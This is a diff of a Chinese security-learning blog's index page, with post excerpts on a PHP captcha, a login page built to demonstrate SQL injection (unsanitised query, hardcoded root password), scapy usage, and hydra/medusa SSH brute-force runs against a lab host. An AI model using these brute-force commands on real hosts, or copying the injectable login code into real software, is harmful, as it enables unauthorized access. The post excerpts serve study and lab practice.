class="line">&lt;?php</span><br><span class="line">// &lt;!-- 利用Session 保存图片验证码 --&gt;</span><br><span class="line">session_start();  // 当客户端已经获取Session ID，只要通过HTTP请求中的Cookies 字段发送给服务器，服务器不再生成</span><br><span class="line">function get_vcode($vlen=4,$width=80,$height =25)</span><br><span class="line">&#123;</span><br><span class="line">    // 定义响应类型为png</span><br><span class="line">    header(&quot;content-type:image/png&quot;);</span><br><span class="line">    $chars = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $vcode = substr(str_shuffle($chars),0,$vlen);</span><br><span class="line"></span><br><span class="line">    $_SESSION[&#x27;vcode&#x27;] = $vcode;</span><br><span class="line">    // 定义图片的背景 RGB 100 200 100</span><br><span class="line">    $image = imagecreate($width,$height);</span><br><span class="line">    $imgColor = imagecolorallocate($image,100,200,100);</span><br><span class="line"></span><br><span class="line">    // 绘制黑色文字</span><br><span class="line">    $color = imagecolorallocate($image,0,0,0);</span><br><span class="line">    imagestring($image,5,20,5,$vcode,$color);</span><br><span class="line"></span><br><span class="line">    //生成一批随机位置的干扰点</span><br><span class="line">    for($i=0;$i&lt;50;$i++)</span><br><span class="line">    &#123;</span><br><span class="line">        imagesetpixel($image,rand(0,$width),rand(0,$height),$color);</span><br><span class="line">    &#125;</span><br><span class="line">    // 输出图片</span><br><span class="line">    imagepng($image);</span><br><span class="line">    imagedestory($image);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">get_vcode();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>2、验证码 保存在session 中，可以在服务器上进行确认，路径如下</p>
-<p><img src="https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231116225534220.png" alt="image-20231116225534220"></p>
-<p>3、设置验证码，使用一次就失效，防止重放</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 每次登录用过一次，清空vcode</span><br><span class="line">unset($_SESSION[&#x27;vcode&#x27;]);</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231120212216632.png" alt="image-20231120212216632"></p>
-<p><img src="https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231120212242558.png" alt="image-20231120212242558"></p>
-<p>全部报 vcode-error ，在服务器的session 中没有vcode 字段，防止一个通过的验证码一直重用。</p>
-<p>修改代码如下：</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/11/16/Web%E6%B8%97%E9%80%8F/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9B%B8%E5%85%B3/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/11/09/Web%E6%B8%97%E9%80%8F/%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="hack_zz">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hack_zz">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/11/09/Web%E6%B8%97%E9%80%8F/%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">登录漏洞-实现原理</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-11-09 00:00:00" itemprop="dateCreated datePublished" datetime="2023-11-09T00:00:00+08:00">2023-11-09</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>1、环境配置</p>
-<p>xmapp +centos7</p>
-<p>登录代码：</p>
-<p>login.html</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;登录&lt;/h2&gt;</span><br><span class="line">    &lt;!-- form提交方式 --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form action=&quot;login.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;username&quot;&gt;用户名:&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;label for=&quot;password&quot;&gt;密码:&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        &lt;label for=&quot;captcha&quot;&gt;验证码:&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; id=&quot;captcha&quot; name=&quot;captcha&quot; required&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt; </span><br><span class="line"></span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>login.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    $username = $_POST[&#x27;username&#x27;];</span><br><span class="line">    $password = $_POST[&#x27;password&#x27;];</span><br><span class="line">    $captcha = $_POST[&#x27;captcha&#x27;];</span><br><span class="line"></span><br><span class="line">    if ($captcha !==&#x27;0000&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        die(&#x27;vcode-error&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $conn = mysqli_connect(&#x27;127.0.0.1&#x27;,&#x27;root&#x27;,&#x27;123456&#x27;,&#x27;learn&#x27;);</span><br><span class="line"></span><br><span class="line">    if (!$conn) &#123;</span><br><span class="line">        die(&quot;连接失败: &quot; . mysqli_connect_error());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_query($conn,&quot;set names utf8&quot;);</span><br><span class="line">    $sql = &quot;select * from  user_account where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">    $result = mysqli_query($conn,$sql);</span><br><span class="line"></span><br><span class="line">    if (mysqli_num_rows($result) == 1) &#123;</span><br><span class="line">       echo &quot;login-success&quot;;</span><br><span class="line">       echo &quot;&lt;script&gt;location.href=&#x27;hello.php&#x27;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;login-fail&quot;;</span><br><span class="line">        echo &quot;&lt;script&gt;location.href=&#x27;login.php&#x27;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>2、测试sql 注入</p>
-<p>在登录页面输入单引号作为用户名，密码123456，验证码0000，响应如下</p>
-<p><img src="https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231109211847591.png" alt="image-20231109211847591"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/11/09/Web%E6%B8%97%E9%80%8F/%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/11/06/Web%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="hack_zz">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hack_zz">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/11/06/Web%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">渗透测试基础</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-11-06 00:00:00" itemprop="dateCreated datePublished" datetime="2023-11-06T00:00:00+08:00">2023-11-06</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>一、渗透测试基础</p>
-<p>1、<strong>概念</strong></p>
-<p>渗透测试是一种模拟恶意攻击者的技术和方法，取得访问控制权，并发现具备业务影响后果安全隐患的一种安全测试和评估方法。</p>
-<p>2、类型</p>
-<p>黑盒测试、白盒测试、灰盒测试</p>
-<p>3、<strong>生命周期</strong></p>
-<p>漏洞挖掘-&gt;0-day-&gt;1-day-&gt;N-day-&gt;修补</p>
-<p>4、需要授权的场景</p>
-<p>（1）为客户提供渗透测试服务</p>
-<p>  (2) 针对非客户的自有系统，建议获取授权后测试</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/11/06/Web%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/11/01/%E7%BC%96%E7%A8%8B/scapy%E4%BD%BF%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="hack_zz">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hack_zz">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/11/01/%E7%BC%96%E7%A8%8B/scapy%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">scapy 使用</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-11-01 00:00:00" itemprop="dateCreated datePublished" datetime="2023-11-01T00:00:00+08:00">2023-11-01</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BC%96%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">编程</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>1、scapy 安装</p>
-<p>pip install scapy</p>
-<p>2、基本功能</p>
-<p>监听流量，分析流量，编辑流量数据包（数据链路层，网络层，传输层）</p>
-<p>3、基本使用</p>
-<ul>
-<li><p>shell使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">命令行下直接执行scapy</span><br><span class="line"># 显示接口信息</span><br><span class="line"> show_interfaces()</span><br><span class="line"> # 抓包</span><br><span class="line"> pkg= sniff(count=100,filter=&quot;icmp&quot;)</span><br><span class="line"> pkg.summary()</span><br><span class="line"> # 发送数据 5个数据包，间隔为1 payload=&quot;HHHHHHHHHHHHHHHHHHHHHHHHHHHH&quot;</span><br><span class="line"> send(IP(dst=&quot;192.168.101.6&quot;)/ICMP()/&quot;HHHHHHHHHHHHHHHHHHHHHHHHHHHH&quot;)</span><br><span class="line"> #接收数据包</span><br><span class="line">  pkg = sr1(IP(dst=&quot;192.168.101.6&quot;)/ICMP()/&quot;HHHHHHHHHHHHHHHHHHHHHHHHHHHH&quot;)</span><br><span class="line">  # 发送/接收arp 数据包</span><br><span class="line">  pkg = sr1(ARP(psrc=&#x27;192.168.101.8&#x27;,pdst=&quot;192.168.101.6&quot;))</span><br><span class="line">  </span><br><span class="line">  # 显示协议字段</span><br><span class="line">  &gt;&gt;&gt; ARP().show()</span><br><span class="line">    ###[ ARP ]###</span><br><span class="line">      hwtype    = Ethernet (10Mb)</span><br><span class="line">      ptype     = IPv4</span><br><span class="line">      hwlen     = None</span><br><span class="line">      plen      = None</span><br><span class="line">      op        = who-has</span><br><span class="line">      hwsrc     = 4c:ed:fb:94:b4:25</span><br><span class="line">      psrc      = 192.168.101.8</span><br><span class="line">      hwdst     = 00:00:00:00:00:00</span><br><span class="line">      pdst      = 0.0.0.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231101221319966.png" alt="image-20231101221319966"></p>
-</li>
-<li><p>python</p>
-<p>等待更新</p>
-</li>
-</ul>
-
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/11/01/%E7%BC%96%E7%A8%8B/scapy%E4%BD%BF%E7%94%A8/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/10/31/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7%E7%AF%87/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="hack_zz">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hack_zz">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/31/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7%E7%AF%87/" class="post-title-link" itemprop="url">工具篇</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-31 00:00:00" itemprop="dateCreated datePublished" datetime="2023-10-31T00:00:00+08:00">2023-10-31</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">黑客工具</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>1、爆破工具</p>
-<ul>
-<li>hydra</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE</span><br><span class="line">  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE</span><br><span class="line">  -C FILE   colon separated &quot;login:pass&quot; format, instead of -L/-P options</span><br><span class="line">  -M FILE   list of servers to attack, one entry per line, &#x27;:&#x27; to specify port</span><br><span class="line">  -t TASKS  run TASKS number of connects in parallel per target (default: 16)</span><br><span class="line">  -U        service module usage details</span><br><span class="line">  -m OPT    options specific for a module, see -U output for information</span><br><span class="line">  -h        more command line options (COMPLETE HELP)</span><br><span class="line">  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)</span><br><span class="line">  service   the service to crack (see below for supported protocols)</span><br><span class="line">  OPT       some service modules support additional input (-U for module help)</span><br><span class="line"></span><br><span class="line">Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>示例：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ hydra -l cleint -P ./password.txt 192.168.101.7 ssh          </span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-31 10:42:10</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:1/p:2), ~1 try per task</span><br><span class="line">[DATA] attacking ssh://192.168.101.7:22/</span><br><span class="line">[22][ssh] host: 192.168.101.7   login: cleint   password: qwe123</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-31 10:42:12</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>medusa</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ medusa -h 192.168.101.7 -u cleint -P ./password.txt -M ssh    </span><br><span class="line">Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;</span><br><span class="line"></span><br><span class="line">ACCOUNT CHECK: [ssh] Host: 192.168.101.7 (1 of 1, 0 complete) User: cleint (1 of 1, 0 complete) Password: 123456 (1 of 2 complete)</span><br><span class="line">ACCOUNT CHECK: [ssh] Host: 192.168.101.7 (1 of 1, 0 complete) User: cleint (1 of 1, 0 complete) Password: qwe123 (2 of 2 complete)</span><br><span class="line">ACCOUNT FOUND: [ssh] Host: 192.168.101.7 User: cleint Password: qwe123 [SUCCESS]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>2、端口扫描工具</p>
-<p>nmap</p>
-<ul>
-<li><p>扫描操作系统</p>
-<p>原理 ：<strong>Nmap维护一个nmap-os-db数据库</strong>，存储了上千种操作系统信息，简单一点来说,<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Nmap&spm=1001.2101.3001.7020">Nmap</a>通过TCP&#x2F;IP协议栈的指纹信息来识别目标主机的操作系统信息，这<strong>主要是利用了RFC标准中，没有强制规范了TCP&#x2F;IP的某些实现,于是不同的系统中TCP&#x2F;IP的实现方案可能都有其特定的方式，这些细节上的差异，给nmap识别操作系统信息提供了方案</strong>，具体一点说,Nmap分别<strong>挑选一个close和open的端口，分别发送给一个经过精心设计的TCP&#x2F;UDP数据包，当然这个数据包也可能是ICMP数据包</strong>。然后根据收到返回报文,生成一份系统指纹。通过对比检测生成的指纹和nmap-os-db数据库中的指纹，来查找匹配的系统。最坏的情况下，没有办法匹配的时候,则用概率的形式枚举出所有可能的信息。</p>
-</li>
-</ul>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/10/31/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7%E7%AF%87/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1111,20 +1120,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-count">128</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
